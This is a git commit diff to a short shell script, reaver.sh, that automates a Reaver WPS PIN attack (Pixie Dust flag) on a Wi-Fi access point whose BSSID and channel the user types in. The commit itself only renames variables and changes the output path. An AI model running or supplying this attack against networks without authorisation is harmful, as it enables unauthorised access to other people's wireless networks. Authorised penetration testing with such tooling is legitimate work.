40fa527627a4bbc31b965ad0cdb64ff3a28a973a
xiXRedNomadXix <124952504+xiXRedNomadXix@users.noreply.github.com>
2023-02-12 22:41:36 +0000

    Update reaver.sh

--- reaver.sh
+++ reaver.sh
@@ -3,10 +3,10 @@
 ##################################### Reaver attack automation ##################################
 
 
-read -ep "Target BSSID: " TGT
+read -ep "Target BSSID: " tgt
 
-read -ep "Target Channel: " CHAN
+read -ep "Target Channel: " chan
 
-read -ep "Output File Name: " TXT
+read -ep "Output File Name: " txt
 
-sudo reaver -i wlan1mon -b $TGT -c $CHAN -K -S -vvv | tee /home/user/Desktop/Collection/ReaverDump/$TXT.txt
+sudo reaver -i wlan1mon -b $tgt -c $chan -K -S -vvv | tee $txt.txt
